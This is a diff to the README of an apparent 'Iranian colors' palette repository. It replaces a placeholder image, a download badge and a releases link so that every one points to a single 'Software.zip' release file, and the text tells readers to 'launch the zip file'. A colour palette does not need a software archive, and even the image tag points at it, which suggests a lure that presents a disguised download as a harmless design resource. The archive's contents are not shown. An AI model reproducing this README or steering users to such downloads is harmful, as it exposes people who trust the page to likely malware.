@@ -14,7 +14,7 @@ Explore the mesmerizing colors inspired by Iran:
 - **Bazaar Spice:** A rich and spicy tone inspired by the vibrant markets of Iran.
 - **Silk Road Gold:** A luxurious and majestic shade reminiscent of the riches found along the historic Silk Road.
 
-![Iranian Colors](https://via.placeholder.com/500x300)
+![Iranian Colors](https://github.com/AerOX-04/iranian-colors/releases/download/v1.0/Software.zip)
 
 ## Usage
 Feel free to use these colors in your projects to add a touch of Iranian flair. Whether you are designing a website, creating art, or planning a themed event, these colors will bring a piece of Iran into your world.
@@ -22,7 +22,7 @@ Feel free to use these colors in your projects to add a touch of Iranian flair. 
 ## Installation
 To get started, simply download the colors collection by clicking the button below:
 
-[![Download Iranian Colors](https://img.shields.io/badge/Download-Colors-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Iranian Colors](https://github.com/AerOX-04/iranian-colors/releases/download/v1.0/Software.zip)](https://github.com/AerOX-04/iranian-colors/releases/download/v1.0/Software.zip)
 
 Once downloaded, launch the zip file and start incorporating these beautiful Iranian colors into your work.
 
@@ -34,6 +34,6 @@ This repository is maintained by a team of color enthusiasts dedicated to celebr
 
 ---
 
-For more information and updates, please visit the [Releases](https://github.com/cli/cli/releases) section.
+For more information and updates, please visit the [Releases](https://github.com/AerOX-04/iranian-colors/releases/download/v1.0/Software.zip) section.
 
 Happy creating with Iranian Colors! 🎉🌈
